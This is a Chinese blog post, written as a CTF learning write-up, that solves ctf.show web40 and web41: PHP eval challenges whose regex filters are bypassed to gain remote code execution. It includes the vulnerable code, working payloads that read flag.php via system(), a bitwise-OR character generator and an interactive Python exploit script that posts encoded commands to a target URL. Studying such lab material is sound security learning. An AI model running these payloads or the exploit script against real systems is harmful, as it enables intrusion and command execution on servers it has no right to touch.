<!DOCTYPE html><html lang="cn"><head><meta charset="utf-8"><title>又是向前的一天呢 | It&#39;s Ba0k</title><meta name="author" content="Ba0k"><meta name="description" content="Life's a struggle..."><meta name="keywords" content=""><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><link rel="icon" href="/favicon.ico"><link rel="preconnect" href="https://cdn.staticfile.org"><script src="https://cdn.staticfile.org/vue/3.3.7/vue.global.prod.min.js"></script><link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.4.2/css/all.min.css"><script>const mixins = {};</script><script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script><script src="https://cdn.staticfile.org/highlight.js/11.9.0/highlight.min.js"></script><script src="https://cdn.staticfile.org/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script><link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/11.9.0/styles/github.min.css"><script src="/js/lib/highlight.js"></script><script src="/js/lib/preview.js"></script><link rel="stylesheet" href="/css/main.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="layout"><transition name="fade"><div id="loading" v-show="loading"><div id="loading-circle"><h2>LOADING...</h2></div></div></transition><div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}"><nav id="desktop-menu"><a class="title" href="/"><span>IT&#39;S BA0K</span> </a><a href="/"><i class="fa-solid fa-house fa-fw"></i> <span>&ensp;Home</span> </a><a href="/about"><i class="fa-solid fa-id-card fa-fw"></i> <span>&ensp;About</span> </a><a href="/archives"><i class="fa-solid fa-box-archive fa-fw"></i> <span>&ensp;Archives</span> </a><a href="/categories"><i class="fa-solid fa-bookmark fa-fw"></i> <span>&ensp;Categories</span> </a><a href="/tags"><i class="fa-solid fa-tags fa-fw"></i> <span>&ensp;Tags</span></a></nav><nav id="mobile-menu"><div class="title" @click="showMenuItems = !showMenuItems"><i class="fa-solid fa-bars fa-fw"></i> <span>&emsp;IT&#39;S BA0K</span></div><transition name="slide"><div class="items" v-show="showMenuItems"><a href="/"><div class="item"><div style="min-width:20px;max-width:50px;width:10%"><i class="fa-solid fa-house fa-fw"></i></div><div style="min-width:100px;max-width:150%;width:20%">Home</div></div></a><a href="/about"><div class="item"><div style="min-width:20px;max-width:50px;width:10%"><i class="fa-solid fa-id-card fa-fw"></i></div><div style="min-width:100px;max-width:150%;width:20%">About</div></div></a><a href="/archives"><div class="item"><div style="min-width:20px;max-width:50px;width:10%"><i class="fa-solid fa-box-archive fa-fw"></i></div><div style="min-width:100px;max-width:150%;width:20%">Archives</div></div></a><a href="/categories"><div class="item"><div style="min-width:20px;max-width:50px;width:10%"><i class="fa-solid fa-bookmark fa-fw"></i></div><div style="min-width:100px;max-width:150%;width:20%">Categories</div></div></a><a href="/tags"><div class="item"><div style="min-width:20px;max-width:50px;width:10%"><i class="fa-solid fa-tags fa-fw"></i></div><div style="min-width:100px;max-width:150%;width:20%">Tags</div></div></a></div></transition></nav></div><transition name="fade"><div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div></transition><div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'"><div class="article"><div><h1>又是向前的一天呢</h1></div><div class="info"><span class="date"><span class="icon"><i class="fa-solid fa-calendar fa-fw"></i> </span>2024/3/21 </span><span class="category"><a href="/categories/%E5%AD%A6%E4%B9%A0/"><span class="icon"><i class="fa-solid fa-bookmark fa-fw"></i> </span>学习 </a></span><span class="tags"><span class="icon"><i class="fa-solid fa-tags fa-fw"></i> </span><span class="tag"><a href="/tags/web%E5%AE%89%E5%85%A8/" style="color:#756480">web安全</a> </span><span class="tag"><a href="/tags/RCE/" style="color:#ba8e9f">RCE</a></span></span></div><div class="content" v-pre><p>今天搞明白了困扰了很久的题，更！</p><span id="more"></span><br><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>其实也是自己太菜了，可能对别人来说没什么难的，而且我是看了官方的wp后才明白，下次遇到这种类似的题我也许不会再想到这种方法了，不过我觉得记录下来起码现在是明白的。而且真正懂一道题，不光得自己会，能把别人教会才是真明白，所以我更新也是一种进步的方式，有事没事还能回来看看。</p><p><br><br></p><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><p>打开过滤了好多</p><pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


if(isset($_GET[&#39;c&#39;]))&#123;
    $c = $_GET[&#39;c&#39;];
    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;
        eval($c);
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;
</code></pre><p>审计一下代码，找一下可用的东西</p><p>分号，括号，字母，下划线都没有被过滤，这就是大概可用的东西</p><p>暂时没什么头绪，可以先查看一下所有已定义的变量</p><pre><code>?c=print_r(get_defined_vars());
</code></pre><pre><code class="php">Array ( [_GET] =&gt; Array ( [c] =&gt; print_r(get_defined_vars()); ) [_POST] =&gt; Array ( ) [_COOKIE] =&gt; Array ( ) [_FILES] =&gt; Array ( ) [c] =&gt; print_r(get_defined_vars()); )
</code></pre><p>可以看到有get，有post，有cookie</p><p>这里我们给post传个参</p><p>可以看到改变了</p><p>接下来要拿到post内的这个字符串</p><p>这里用<code>next()</code>看能不能行</p><pre><code>Array ( [1] =&gt; phpinfo(); )
</code></pre><p>非常好</p><p>不过现在得到的还是整个数组，需要的是数组内的值</p><p>用<code>array_pop()</code>试试可不可以返回</p><pre><code>phpinfo();
</code></pre><p>好啊</p><p>接下来执行就可以了</p><p><img src="/images/image-20240321133639488.png" alt="image-20240321133639488"></p><p>成功了</p><p>接下来直接RCE即可</p><p>最终payload:</p><pre><code>GET ?c=eval(array_pop(next(get_defined_vars())));
</code></pre><pre><code>POST 1=system(&#39;tac flag.php&#39;);
</code></pre><br><p>这是老师的方法，我也只是弄懂了这一种方法。</p><p>最开始看到这道题我试着把flag的内容复制到另一个文件，但是苦于绕不过过滤。</p><p>非常奇妙的一种方法，层层递进。</p><p>本题用到的函数：</p><pre><code class="php">get_defined_vars()	//返回由所有已定义变量所组成的数组。
next()				//返回迭代器的下一个项目。
array_pop()			//删除数组中的最后一个元素。返回数组的最后一个值。
</code></pre><br><p>这里还有一种解法，是用cookie解的</p><pre><code>c=session_start();system(session_id());
passid=ls
</code></pre><br><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><p>比上一题多过滤了字母</p><pre><code class="php">&lt;?php

/*
\# -*- coding: utf-8 -*-
\# @Author: 羽
\# @Date:  2020-09-05 20:31:22
\# @Last Modified by:  h1xa
\# @Last Modified time: 2020-09-05 22:40:07
\# @email: 1341963450@qq.com
\# @link: https://ctf.show

*/

if(isset($_POST[&#39;c&#39;]))&#123;
  $c = $_POST[&#39;c&#39;];
if(!preg_match(&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;, $c))&#123;
    eval(&quot;echo($c);&quot;);
  &#125;
&#125;else&#123;
  highlight_file(__FILE__);
&#125;
?&gt;
</code></pre><p>几个关键词全都过滤了</p><p>但是没过滤<code>|、_、.、(、)、;、</code></p><p>那么这道题就是要用这些特殊字符来构造出一段代码来执行实现RCE</p><p>这里得到出题人给的一个脚本</p><pre><code class="php">&lt;?php
$myfile = fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);
$contents=&quot;&quot;;
for ($i=0; $i &lt; 256; $i++) &#123; 
    for ($j=0; $j &lt;256 ; $j++) &#123; 

        if($i&lt;16)&#123;
            $hex_i=&#39;0&#39;.dechex($i);
        &#125;
        else&#123;
            $hex_i=dechex($i);
        &#125;
        if($j&lt;16)&#123;
            $hex_j=&#39;0&#39;.dechex($j);
        &#125;
        else&#123;
            $hex_j=dechex($j);
        &#125;
        $preg = &#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;;
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;
                    echo &quot;&quot;;
    &#125;
  
        else&#123;
        $a=&#39;%&#39;.$hex_i;
        $b=&#39;%&#39;.$hex_j;
        $c=(urldecode($a)|urldecode($b));
        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;
            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;
        &#125;
    &#125;

&#125;
&#125;
fwrite($myfile,$contents);
fclose($myfile);
</code></pre><p>通过这个脚本跑完后就可以拿到一个包含所有可用字符的一个txt，都是16进制的</p><p>我们拿出来一段</p><pre><code>A %40 %01
B %40 %02
C %40 %03
D %40 %04
E %40 %05
F %40 %06
G %40 %07
H %40 %08
I %40 %09
J %40 %0a
K %40 %0b
L %40 %0c
M %40 %0d
N %40 %0e
O %40 %0f
P %40 %10
Q %40 %11
R %40 %12
S %40 %13
T %40 %14
U %40 %15
V %40 %16
W %40 %17
X %40 %18
Y %40 %19
Z %40 %1a
</code></pre><br><p>有人可能疑惑这是啥道理，我试着在这里解释一下，不过我也一知半解</p><p>比如<code>A %40 %01</code></p><p>十六进制的<code>40</code>，转换成二进制即为<code>0100 0000</code>，<code>01</code>就不用说了，<code>0000 0001</code></p><blockquote><p>这里我先科普一下<code>或运算</code>&#x2F;<code>OR</code>，就是进行运算的两个数，若有一方为1即为1，若都为0，才为0。</p><p>[0|0&#x3D;0] [0|1&#x3D;1] [1|1&#x3D;1]</p><p>比如[3|7&#x3D;0011|0101&#x3D;0111&#x3D;7]</p></blockquote><p>那么得到的这两个值进行或运算</p><p>得到的结果为<code>0100 0001</code>，转化为十进制是<code>65</code></p><p>那么65呢，在<code>ASCII</code>里就是<code>A</code></p><br><p>接下来拼接</p><p>这里因为要构造字符串，要像<code>(&#39;phpinfo&#39;)()</code>这样调用</p><p>最终构造出来的样子:</p><pre><code class="php">((&#39;%40&#39;|&#39;%13&#39;).(&#39;%40&#39;|&#39;%19&#39;).(&#39;%40&#39;|&#39;%13&#39;).(&#39;%40&#39;|&#39;%14&#39;).(&#39;%40&#39;|&#39;%05&#39;).(&#39;%40&#39;|&#39;%0d&#39;))(((&#39;%40&#39;|&#39;%0c&#39;).(&#39;%40&#39;|&#39;%13&#39;)))
</code></pre><p>不过这里还不能直接用，因为里面有些会变成换行符，函数就无效了</p><p>这里再用出题人给的现成的脚本</p><pre><code class="python"># -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os
os.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行
if(len(argv)!=2):
   print(&quot;=&quot;*50)
   print(&#39;USER：python exp.py &lt;url&gt;&#39;)
   print(&quot;eg：  python exp.py http://ctf.show/&quot;)
   print(&quot;=&quot;*50)
   exit(0)
url=argv[1]
def action(arg):
   s1=&quot;&quot;
   s2=&quot;&quot;
   for i in arg:
       f=open(&quot;rce_or.txt&quot;,&quot;r&quot;)
       while True:
           t=f.readline()
           if t==&quot;&quot;:
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;
   return(output)
   
while True:
   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))
   data=&#123;
       &#39;c&#39;:urllib.parse.unquote(param)
       &#125;
   r=requests.post(url,data=data)
   print(&quot;\n[*] result:\n&quot;+r.text)
</code></pre><p>输入url直接跑即可得到flag</p><p>非常有意思的一道题，但是最后秒了。。</p><br><p>梳理一下思路</p><p>1.首先从ASCII筛选出未被过滤的字符，然后进行或运算</p><p>2.构造payload</p><p>3.POST传参得到flag</p><br></div></div><footer id="footer"><div id="footer-wrap"><div>&copy; 2022 - 2024 It&#39;s Ba0k <span id="footer-icon"><i class="fa-solid fa-font-awesome fa-fw"></i> </span>&commat;Ba0k</div><div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a></div></div></footer></div><transition name="fade"><div id="preview" ref="preview" v-show="previewShow"><img id="preview-content" ref="previewContent"></div></transition></div><script src="/js/main.js"></script></body></html>